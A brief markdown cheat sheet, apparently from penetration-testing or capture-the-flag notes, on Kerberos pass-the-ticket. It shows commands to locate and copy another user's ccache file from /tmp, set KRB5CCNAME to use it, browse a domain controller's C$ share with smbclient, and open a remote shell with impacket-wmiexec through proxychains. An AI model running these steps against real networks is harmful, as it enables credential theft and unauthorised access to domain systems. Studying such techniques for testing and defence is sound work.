# INFO

- ccache files are temporary
- note `valid starting` and `expires` 



# Importing the ccache file into our current session
```
ls -la /tmp | grep krb5
klist -A -f -e -c /tmp/krb5cc_647402606
klist
```
>......no credentials cache found......
```
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
```
>`.......luser@TEST.DE.......`

# using smb with kerberos
```
smbclient //dc01/C$ -k -c ls -no-pass
```


# using impacket with kerberos
```
proxychains impacket-wmiexec dc01 -k -no-pass
whoami
```







